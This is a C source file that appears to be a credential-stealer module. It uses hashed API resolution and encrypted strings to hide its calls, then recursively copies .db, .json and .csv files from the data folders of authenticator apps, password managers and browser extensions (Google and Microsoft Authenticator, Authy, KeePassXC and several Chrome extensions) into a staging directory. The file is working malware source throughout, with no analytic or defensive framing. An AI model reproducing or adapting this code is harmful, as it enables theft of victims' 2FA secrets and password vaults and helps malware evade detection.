#include "twofa.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <windows.h>

#ifdef ENABLE_2FA_GOOGLE
#include <string.h>
#include <stdio.h>
#include <ctype.h>

#define TFA_MAX_PATH 512
#define TFA_MAX_FILES 256

/* ── API function pointer types (kernel32.dll) ──────────────────── */

typedef HANDLE (WINAPI *pCreateFileA_tf)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *pReadFile_tf)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pWriteFile_tf)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pCloseHandle_tf)(HANDLE);
typedef BOOL   (WINAPI *pCreateDirectoryA_tf)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef DWORD  (WINAPI *pGetFileAttributesA_tf)(LPCSTR);
typedef HANDLE (WINAPI *pFindFirstFileA_tf)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindNextFileA_tf)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindClose_tf)(HANDLE);
typedef DWORD  (WINAPI *pGetFileSize_tf)(HANDLE, LPDWORD);
typedef HANDLE (WINAPI *pGetProcessHeap_tf)(void);
typedef LPVOID (WINAPI *pHeapAlloc_tf)(HANDLE, DWORD, SIZE_T);
typedef BOOL   (WINAPI *pHeapFree_tf)(HANDLE, DWORD, LPVOID);

/* ── Resolved API pointers ──────────────────────────────────────── */

static struct {
    pCreateFileA_tf        pCreateFile;
    pReadFile_tf           pReadFile;
    pWriteFile_tf          pWriteFile;
    pCloseHandle_tf        pCloseHandle;
    pCreateDirectoryA_tf   pMkDir;
    pGetFileAttributesA_tf pGetAttr;
    pFindFirstFileA_tf     pFF;
    pFindNextFileA_tf      pFN;
    pFindClose_tf          pFC;
    pGetFileSize_tf        pGetFileSize;
    pGetProcessHeap_tf     pGetHeap;
    pHeapAlloc_tf          pAlloc;
    pHeapFree_tf           pFree;
    int                    ready;
} tf_api;

static void *tf_resolve(void *mod, const char *name) {
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

static int tf_ensure_api(void) {
    if (tf_api.ready) return 1;

    char dll[32], fn[32];
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;

    enc_decrypt(enc_CreateFileA, ENC_CREATEFILEA_LEN, fn);
    tf_api.pCreateFile = (pCreateFileA_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_ReadFile, ENC_READFILE_LEN, fn);
    tf_api.pReadFile = (pReadFile_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_WriteFile, ENC_WRITEFILE_LEN, fn);
    tf_api.pWriteFile = (pWriteFile_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
    tf_api.pCloseHandle = (pCloseHandle_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN, fn);
    tf_api.pMkDir = (pCreateDirectoryA_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
    tf_api.pGetAttr = (pGetFileAttributesA_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
    tf_api.pFF = (pFindFirstFileA_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
    tf_api.pFN = (pFindNextFileA_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
    tf_api.pFC = (pFindClose_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_GetFileSize, ENC_GETFILESIZE_LEN, fn);
    tf_api.pGetFileSize = (pGetFileSize_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_GetProcessHeap, ENC_GETPROCESSHEAP_LEN, fn);
    tf_api.pGetHeap = (pGetProcessHeap_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_HeapAlloc, ENC_HEAPALLOC_LEN, fn);
    tf_api.pAlloc = (pHeapAlloc_tf)tf_resolve(k32, fn);
    enc_decrypt(enc_HeapFree, ENC_HEAPFREE_LEN, fn);
    tf_api.pFree = (pHeapFree_tf)tf_resolve(k32, fn);

    if (!tf_api.pCreateFile || !tf_api.pReadFile || !tf_api.pWriteFile ||
        !tf_api.pCloseHandle || !tf_api.pMkDir || !tf_api.pGetAttr ||
        !tf_api.pFF || !tf_api.pFN || !tf_api.pFC ||
        !tf_api.pGetFileSize || !tf_api.pGetHeap || !tf_api.pAlloc ||
        !tf_api.pFree)
        return 0;

    tf_api.ready = 1;
    return 1;
}

/* ── Target extensions ────────────────────────────────────────── */

static int has_target_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return 0;
    dot++;
    if (_stricmp(dot, "db") == 0) return 1;
    if (_stricmp(dot, "json") == 0) return 1;
    if (_stricmp(dot, "csv") == 0) return 1;
    return 0;
}

/* ── Copy file via Win32 API ──────────────────────────────────── */

static int copy_file(const char *src, const char *dst) {
    HANDLE hIn = tf_api.pCreateFile(src, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING, 0, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return -1;

    DWORD fileSize = tf_api.pGetFileSize(hIn, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        tf_api.pCloseHandle(hIn);
        return -1;
    }

    char *buf = (char *)tf_api.pAlloc(tf_api.pGetHeap(), 0, fileSize);
    if (!buf) {
        tf_api.pCloseHandle(hIn);
        return -1;
    }

    DWORD read = 0;
    BOOL ok = tf_api.pReadFile(hIn, buf, fileSize, &read, NULL);
    tf_api.pCloseHandle(hIn);
    if (!ok || read == 0) {
        tf_api.pFree(tf_api.pGetHeap(), 0, buf);
        return -1;
    }

    HANDLE hOut = tf_api.pCreateFile(dst, GENERIC_WRITE, 0,
                                     NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        tf_api.pFree(tf_api.pGetHeap(), 0, buf);
        return -1;
    }

    DWORD written = 0;
    ok = tf_api.pWriteFile(hOut, buf, read, &written, NULL);
    tf_api.pCloseHandle(hOut);
    tf_api.pFree(tf_api.pGetHeap(), 0, buf);
    return ok ? 0 : -1;
}

/* ── Scan directory recursively ──────────────────────────────────── */

static int scan_dir(const char *dir, const char *output_dir, size_t *count) {
    char pattern[TFA_MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = tf_api.pFF(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return -1;

    do {
        if (*count >= TFA_MAX_FILES) break;

        char fullpath[TFA_MAX_PATH];
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
                continue;
            scan_dir(fullpath, output_dir, count);
        } else {
            if (!has_target_ext(fd.cFileName)) continue;

            char dst_path[TFA_MAX_PATH];
            snprintf(dst_path, sizeof(dst_path), "%s\\%s", output_dir, fd.cFileName);

            HANDLE hTest = tf_api.pCreateFile(dst_path, GENERIC_READ, FILE_SHARE_READ,
                                              NULL, OPEN_EXISTING, 0, NULL);
            if (hTest != INVALID_HANDLE_VALUE) {
                tf_api.pCloseHandle(hTest);
                const char *parent = strrchr(dir, '\\');
                if (parent) parent++; else parent = "2fa";
                snprintf(dst_path, sizeof(dst_path), "%s\\%s_%s",
                         output_dir, parent, fd.cFileName);
            }

            if (copy_file(fullpath, dst_path) == 0)
                (*count)++;
        }
    } while (tf_api.pFN(hFind, &fd));

    tf_api.pFC(hFind);
    return 0;
}

/* ── Collect 2FA data from known authenticator paths ───────────── */

int twofa_collect(const char *output_dir) {
    if (!output_dir) return -1;
    if (!tf_ensure_api()) return -1;

    tf_api.pMkDir(output_dir, NULL);

    const char *local = getenv("LOCALAPPDATA");
    const char *roaming = getenv("APPDATA");

    struct { const char *base; const char *sub; } targets[] = {
        { local,   "Google\\Authenticator" },
        { local,   "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\khcodhlfkpmhibicdjjblnkgimdepgnd" },
        { local,   "Microsoft\\Authenticator" },
        { local,   "Microsoft\\Chrome\\User Data\\Default\\Local Extension Settings\\bfbdnbpibgndpjfhonkflpkijfapmomn" },
        { roaming, "Traktor\\authy" },
        { roaming, "Traktor" },
        { local,   "Authy" },
        { local,   "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\eidlicjlkaiefdbgmdepmmicpbggmhoj" },
        { local,   "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bobfejfdlhnabgglompioclndjejolch" },
        { local,   "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\elokfmmmjbadpgdjmgglocapdckdcpkn" },
        { local,   "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai" },
        { roaming, "KeePassXC" },
        { local,   "KeePassXC" },
        { local,   "Authenticator" },
    };

    size_t count = 0;
    int ntargets = (int)(sizeof(targets) / sizeof(targets[0]));

    for (int i = 0; i < ntargets; i++) {
        const char *base = targets[i].base;
        const char *sub  = targets[i].sub;
        if (!base) continue;

        char dirpath[TFA_MAX_PATH];
        snprintf(dirpath, sizeof(dirpath), "%s\\%s", base, sub);

        scan_dir(dirpath, output_dir, &count);
        if (count >= TFA_MAX_FILES) break;
    }

    return (int)count;
}

#endif /* ENABLE_2FA_GOOGLE */
